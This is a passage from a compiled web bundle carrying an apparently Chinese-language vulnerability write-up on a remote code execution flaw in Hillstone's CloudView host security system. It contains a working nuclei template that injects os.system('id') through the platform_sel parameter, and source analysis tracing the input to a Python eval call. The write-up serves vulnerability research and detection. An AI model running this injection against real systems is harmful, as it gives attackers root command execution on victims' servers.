body="\u5c71\u77f3\u4e91\u9274\u4e3b\u673a\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf"\n  tags: hillstonenet,rce\n\nhttp:\n  - raw:\n      - |\n        GET /master/ajaxActions/getTokenAction.php HTTP/1.1\n        Host: {{Hostname}}\n        Cookie: PHPSESSID=emhpeXVhbg;\n        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0\n        Accept: application/font-woff2;q=1.0,application/font-woff;q=0.9,*/*;q=0.8\n        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n        Accept-Encoding: gzip, deflate, br\n        Sec-Fetch-Dest: font\n        Sec-Fetch-Mode: cors\n        Sec-Fetch-Site: same-origin\n        Te: trailers\n        Connection: close\n\n      - |\n        GET /master/ajaxActions/getMessageSettingAction.php?token_csrf={{token_csrf}}&company_uuid=aaa&platform_sel=os.system("id+>+/opt/var/majorsec/installation/master/runtime/img/config") HTTP/1.1\n        Host: {{Hostname}}\n        Cookie: PHPSESSID=emhpeXVhbg;\n        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0\n        Accept: application/font-woff2;q=1.0,application/font-woff;q=0.9,*/*;q=0.8\n        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n        Accept-Encoding: gzip, deflate, br\n        Sec-Fetch-Dest: font\n        Sec-Fetch-Mode: cors\n        Sec-Fetch-Site: same-origin\n        Te: trailers\n        Connection: close\n\n\n      - |\n        GET /master/img/config HTTP/1.1\n        Host: {{Hostname}}\n        Cookie: PHPSESSID=gs8bl1b288ummccm9n3ub4g323\n        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0\n        Accept: application/font-woff2;q=1.0,application/font-woff;q=0.9,*/*;q=0.8\n        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n        Accept-Encoding: gzip, deflate, br\n        Sec-Fetch-Dest: font\n        Sec-Fetch-Mode: cors\n        Sec-Fetch-Site: same-origin\n        Te: trailers\n        Connection: close\n\n    extractors:\n      # \u6b63\u5219\u5339\u914d\uff0c\u63d0\u53d6\u6574\u4e2a\u5339\u914d\u5230\u7684\u503c\n      - type: regex\n        name: token_csrf\n        part: body_1\n        internal: true\n        regex:\n          - \\S{32}\n\n    matchers-condition: and\n    matchers:\n      - type: word\n        part: body_3\n        words:\n          - "uid=0(root) gid=0(root) groups=0(root)"\n\n      - type: word\n        part: body_2\n        words:\n          - "Status"\n          - "ErrMsg"\n        condition: and\n\n      - type: status\n        part: status_code_2\n        status:\n          - 200\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u8fd9\u4e2a\u6f0f\u6d1e\u4e2d\u51fa\u53d1\u70b9\u662f",(0,r.jsx)(n.code,{children:"getMessageSettingAction.php"}),"\u6587\u4ef6\u7684",(0,r.jsx)(n.code,{children:"platform_sel"}),"\u53c2\u6570\uff0c\u67e5\u770b\u76f8\u5173\u4ee3\u7801\uff0c\u53d1\u73b0\u662f\u4e00\u6bb5",(0,r.jsx)(n.code,{children:"json"}),"\u8bf7\u6c42"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\ninclude \"../permission.php\";\nif(!isPermission('operator')){\n    echo \"F\";\n    return;\n}else if(!verifyToken()){\n    echo \"F\";\n    return;\n}\n    include_once \"../includeUtils.php\";\n    session_write_close();\n    $company_uuid = $_GET['company_uuid'];\n    $platform_sel = $_GET['platform_sel'];\n    $param = \"{\" . '\"company_uuid\":\"'.$company_uuid .'\"';\n    $param = $param . ',' . '\"setting_type\":' . $platform_sel;\n    $param = $param . \"}\";\n\n\n    $result=getMessageSettingInfo($param);\n    $resultArray = json_decode($result['body'], true);\n    $resultArray['Result']['sms_template_param'] = base64_decode($resultArray['Result']['sms_template_param']);\n    $resp = array(\"Status\"=>$result['status'], \"Result\"=>$resultArray);\n    echo json_encode($resp,JSON_UNESCAPED_UNICODE);\n?>\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u89e6\u53d1\u65b9\u5f0f\uff0c\u8fd9\u6bb5\u4e3a",(0,r.jsx)(n.code,{children:"python"}),"\u4ee3\u7801"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'os.system("id+>+/opt/var/majorsec/installation/master/runtime/img/config")\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u4e8e\u662f\u4e0d\u96be\u731c\u51faphp\u53ea\u662f\u4e00\u4e2a\u4e2d\u95f4\u4ef7\uff0c\u89e6\u53d1\u7684\u5730\u65b9\u662f",(0,r.jsx)(n.code,{children:"python"}),"\u8d77\u7684\u670d\u52a1\uff0c\u91cc\u9762\u80af\u5b9a\u6709\u4e2a",(0,r.jsx)(n.code,{children:"eval"}),"\u51fd\u6570\u4e4b\u7c7b\u7684"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"function postCommand($parameter){\n    $ch = curl_init(); \n    curl_setopt($ch, CURLOPT_POST, 1); \n    curl_setopt($ch, CURLOPT_POSTFIELDS, $parameter);\n    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); \n    $url = \"http://\".$GLOBALS['serverNm'].\":8000/\";\n    writeLog('post param is '.$parameter, 2);\n    writeLog('url is '.$url, 2);\n    curl_setopt($ch, CURLOPT_URL,$url); \n    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); \n    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); \n    $headers = array(\n        \"Content-Length: \".strlen($parameter),\n        \"Content-Type: application/x-www-form-urlencoded\"\n    ); \n    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); \n    $result = curl_exec ($ch); \n\twriteLog('post api returns:'.$result, 2);\n\t$httpCode = curl_getinfo($ch,CURLINFO_HTTP_CODE);\n\twriteLog($url.' status:'.$httpCode, 2);\n    writeLog($url.' get api returns:'.$result, 2);\n    curl_close ($ch);\n    return array(\"status\"=>$httpCode, \"body\"=>$result);\n\n}\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u627e\u5230\u5176\u4e2d\u7684",(0,r.jsx)(n.code,{children:"python"}),"\u670d\u52a1"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648370.png",alt:"image-20240911103748098"})}),"\n",(0,r.jsx)(n.p,{children:"\u67e5\u770b\u76f8\u5173\u4ee3\u7801\u53d1\u73b0\u4e3a\u4e00\u4e2a\u7b80\u6613\u7684python\u670d\u52a1\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"class CommandHandler (tornado.web.RequestHandler):\n    # @gen.coroutine\n    def post(self):\n        try:\n            logging.debug('\\n'.join(\n                '{0}:{1}'.format(k, v) for (k, v) in self.request.headers.get_all()\n            ))\n            logging.debug(self.request.body)\n\n            command = self.request.body\n            ret, msg = routeCommand(command, self)\n\n            if ret and ret != \"alreadySendToFrontEnd\":\n                self.write(msg)\n                self.finish()\n            elif not ret:\n                logging.error(msg)\n                raise Exception(msg)\n        except Exception as e:\n            logging.error(\"CommandHandler Exception: {}\".format(e))\n            raise tornado.web.HTTPError(400)\n\n    def yamin_send_back(self, code, msg):\n        logging.debug('msg:' + str(msg))\n        self.write(msg)\n        self.flush()\n        self.finish()\n        return\n\n\nconf, store = {}, {}\n\n\nif not initStore():\n    sys.exit(-1)\n\napp = tornado.web.Application([\n    (r\"/\", CommandHandler),\n])\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u8def\u7531\u5904\u7406\u51fd\u6570",(0,r.jsx)(n.code,{children:"routeCommand"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"def routeCommand(commandline, handler):\n    global conf\n    if not commandline:\n        return False, \"Invalid command\"\n\n    if len(commandline) > 4096 or len(commandline) < 4:\n        return False, \"Invalid command\"\n\n    command, args = None, None\n    try:\n        l = commandline.split('|', 1)\n        command, args = l[:2] if len(l) > 1 else (l[0], '')\n    except Exception as e:\n        return False, \"Cannot parse {}:{}\".format(commandline, e)\n\n    stage = getStage()\n    if command not in commands[stage]:\n        return False, \"Invalid command {0} at stage {1}\".format(command, stage)\n    if stage in (2, 3) and not initStore():\n        return False, \"Unavailable service\"\n\n    conf['server'] = handler\n    try:\n        command = command.replace('-', '_')\n        return eval(command)(args=args.split('|'), conf=conf, store=store)\n    except Exception as e:\n        return False, e\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd9\u6bb5\u51fd\u6570\u5c31\u662f\u901a\u8fc7\u5904\u7406\u4e0d\u540c\u7684",(0,r.jsx)(n.code,{children:"command"}),"\u5206\u522b\u8c03\u7528\u4e0d\u540c\u7684\u51fd\u6570"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"return eval(command)(args=args.split('|'), conf=conf, store=store)\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd9\u4e2a",(0,r.jsx)(n.code,{children:"command"})," \u4e5f\u6709\u4e00\u6bb5\u5217\u8868\uff0c\u4e5f\u5c31\u662f"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"commands = [\n    # bootstrap.sh\n    ['dummy', 'ping', 'init-dbs', 'set-init-stage', 'call-upgrade-dbs', 'get-suid',\n     'get-company-uuid', 'set-company-init', 'set-hasher-link', 'verify-passwd'],\n    # cli.py\n    ['dummy', 'ping', 'set-net', 'get-net', 'get-suid', 'set-hasher-link', 'set-userinfo', 'get-command-result',\n     'set-init-stage', 'get-init-stage', 'update-serverjson', 'get-company-uuid', 'set-company-init', 'verify-passwd'],\n    #  config system via master\n    ['dummy', 'ping', 'set-net', 'get-net', 'set-system', 'set-license', 'get-net2', 'get-backup-config', 'set-backup-run',\n     'set-userinfo', 'get-license', 'get-userinfo', 'get-datetime', 'get-company-uuid', 'set-backup-test', 'set-backup-config', 'get-license-info',\n     'set-passwd', 'set-init-stage', 'get-init-stage', 'set-datetime', 'set-ntp', 'get-ntp', 'get-zonelist', 'set-hasher-link', 'get-uptime','set-firstconfig',\n     'set-certificate', 'get-if-pw-changed', 'set-nginx-reload', 'set-company-init', 'get-greeting-message-status', 'get-backup-filelist-v2', 'set-makeAgent',\n     'set-start-init', 'get-cer-time', 'get-cer-info', 'set-zonetime', 'get-log', 'set-greeting-message-status', 'get-command-result', 'set-move-file',\n     'get-mail-info', 'set-mail-info', 'restart-appliance', 'update-serverjson', 'get-suid', 'apply-hotfix', 'get-license-preview', 'set-customziedId',\n     'verify-passwd', 'change-service-status', 'get-service-status', 'get-remote-status', 'get-company-list', 'get-sms-setting',\n     'disable-remote', 'get-remote-token', 'get-cpuMem', 'get-cpuMem2', 'get-disk', 'get-upgrade-integrity', 'get-upgrade-log', 'get-company-code',\n     'get-account-state', 'unlock-account', 'set-mp-time', 'get-login-failed-count', 'get-license-expired', 'get-current-license-info', 'get-block-incoming-logs'],\n    #  system is running\n    ['dummy', 'ping', 'set-passwd', 'set-service', 'get-if-pw-changed', 'get-net2', 'get-command-result', 'set-backup-test', 'set-backup-config',\n     'set-certificate', 'set-license', 'set-userinfo', 'set-datetime', 'set-ntp', 'get-ntp', 'get-zonelist', 'get-company-uuid',\n     'set-system', 'set-repo', 'download-file', 'get-backup-filelist', 'get-log', 'get-product-info', 'set-backup-run',\n     'get-upgrade-fileinfo', 'get-system', 'get-service-status', 'get-remote-status', 'set-service-restart-after-time-change', 'get-company-code',\n     'get-mail-info', 'set-mail-info', 'set-zonetime', 'get-datetime', 'set-hasher-link', 'get-backup-config', 'get-command-result', 'set-company',\n     'get-userinfo', 'get-license', 'set-net', 'get-net', 'set-init-stage', 'get-greeting-message-status', 'verify-passwd', 'set-firstconfig',\n     'get-init-stage', 'get-disk', 'get-cpuMem', 'get-cer-time', 'get-suid', 'get-cpuMem2', 'get-backup-filelist-v2', 'set-move-file',\n     'get-cer-info', 'get-company-code', 'restart-appliance', 'get-ehelp-ticket', 'set-greeting-message-status', 'get-about-us', 'apply-offline-package',\n     'set-ehelp-ticket', 'e-help', 'update-serverjson', 'e-help-download', 'get-upgrade-status', 'get-license-info', 'set-makeAgent', 'get-mt-status',\n     'download-upgrade-file', 'shutdown-appliance', 'get-server-agent-vers', 'get-remote-token', 'get-license-preview', 'change-service-status',\n     'agent-json-to-sqlite', 'send-signal-process', 'apply-hotfix', 'sync-serverjson', 'get-license-days', 'set-customziedId', 'force-restart-appliance',\n     'get-sms-setting', 'set-sms-setting', 'disable-remote', 'set-sms-test', 'get-company-list', 'get-uptime', 'get-upgrade-integrity',\n     'get-upgrade-log', 'get-account-state', 'unlock-account', 'set-mp-time', 'set-cleandisk-threshold', 'get-cleandisk-threshold', 'get-login-failed-count',\n     'get-license-expired', 'get-current-license-info', 'get-block-incoming-logs'],\n    #  dummy\n    ['get-upgrade-status', 'get-upgrade-log'],\n    # upgrade system via yamin-self\n    ['dummy', 'ping', 'set-init-stage', 'get-init-stage']\n]\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u4e0a\u6587\u63d0\u5230\u7684",(0,r.jsx)(n.code,{children:"POC"}),"\uff0c\u5728",(0,r.jsx)(n.code,{children:"php"}),"\u4e2d\u7684\u76f8\u5173\u4ee3\u7801\u5982\u4e0b"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'function getMessageSettingInfo($param){\n    return handleEmptyResult(postCommand("get-sms-setting|".$param));\n}\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u5b83\u5728",(0,r.jsx)(n.code,{children:"python"}),"\u7684\u903b\u8f91\u662f"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"def get_sms_setting(**kwargs):\n    try:\n        store = kwargs['store']\n        args = kwargs['args']\n        param = eval(args[0])\n        # company_id = 0\n        if \"company_uuid\" not in param:\n            logging.error(\"invalid request, not found company_uuid\")\n            return True, setResult(1, \"invalid request, not found company_uuid\")\n        if \"setting_type\" not in param:\n            logging.error(\"invalid request, not found setting_type\")\n            return True, setResult(1, \"invalid request, not found setting_type\")\n        with store['dbs'].connect() as conn:\n            q2 = {\n                \"query\": \"CALL `mjs`.`usp_alert_get_sms_setting`(:company_uuid,:setting_type,@r)\",\n                \"args\": {\n                    \"company_uuid\": param['company_uuid'],\n                    \"setting_type\": param['setting_type']\n                }\n            }\n            logging.debug(\"get sms setting by cmd: {}\".format(q2))\n            res = []\n\n            def get_setting_details(result):\n                row = result.fetchone()\n                setting_info = {}\n                setting_info['company_uuid'] = param['company_uuid']\n                # setting_info['setting_id'] = row['setting_id']\n                setting_info['region'] = row['region']\n                setting_info['access_key_id'] = row['access_key_id']\n                setting_info['access_key_secret'] = row['access_key_secret']\n                setting_info['entry_point'] = row['entry_point']\n                setting_info['topic'] = row['topic']\n                setting_info['sms_template_code'] = row['sms_template_code']\n                setting_info['sms_template_param'] = row['sms_template_param']\n                setting_info['sms_sign_name'] = row['sms_sign_name']\n                setting_info['status'] = row['status']\n                res.append(setting_info)\n            dbs_call(get_setting_details, conn, **q2)\n            if not len(res):\n                logging.error(\"not obtain sms setting details\")\n                return True, setResult(1, \"not obtain sms setting details\")\n        logging.debug(\"got sms setting detail: {}\".format(res[0]))\n        return True, setResult(0, res[0])\n    except Exception as e:\n        logging.error(\"get_sms_setting exception: {}\".format(e))\n        return True, setResult(1, \"get_sms_setting exception: {}\".format(e))\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u53ef\u4ee5\u770b\u5230",(0,r.jsx)(n.code,{children:"param = eval(args[0])"})," \u662f\u6f0f\u6d1e\u7684\u89e6\u53d1\u4f4d\u7f6e\uff0c\u800c ",(0,r.jsx)(n.code,{children:"args[0]"}),"\u5c31\u662f",(0,r.jsx)(n.code,{children:"php"}),"\u7684",(0,r.jsx)(n.code,{children:"$param"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"$company_uuid = $_GET['company_uuid'];\n$platform_sel = $_GET['platform_sel'];\n$param = \"{\" . '\"company_uuid\":\"'.$company_uuid .'\"';\n$param = $param . ',' . '\"setting_type\":' . $platform_sel;\n$param = $param . \"}\";\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u53ef\u4ee5\u770b\u5230 setting_type\u4e3aint\u7c7b\u578b\uff0c\u6211\u4eec\u5373\u53ef\u4f20\u5165\u6076\u610f\u7684python\u4ee3\u7801\uff0c\u6700\u7ec8\u5b9e\u73b0rce"})]})}function p(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(h,{...e})}):h(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>c,x:()=>t});var l=s(6540);const r={},i=l.createContext(r);function c(e){const n=l.useContext(i);return l.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function t(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:c(e.components),l.createElement(i.Provider,{value:n},e.children)}}}]);